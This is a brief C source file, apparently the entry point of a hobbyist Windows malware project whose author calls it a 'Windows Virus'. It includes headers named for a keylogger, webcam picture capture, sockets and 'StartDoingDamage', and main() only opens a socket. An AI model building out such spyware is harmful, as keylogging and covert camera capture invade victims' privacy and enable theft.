/*

	Ron Elmekiesse, 25.9.2020
	This is my Windows Virus code (:

*/



#include "utilities.h"
#include "KeyLogger.h"
#include "TakePicture.h"
#include "escapi.h"
#include "Socket.h"
#include "StartDoingDamage.h"


int main()
{
	
	if (start_socket() != 0)
	{
		printf("Problem in Socket function! \n");
		return -1;
	}

	
	return 0;
}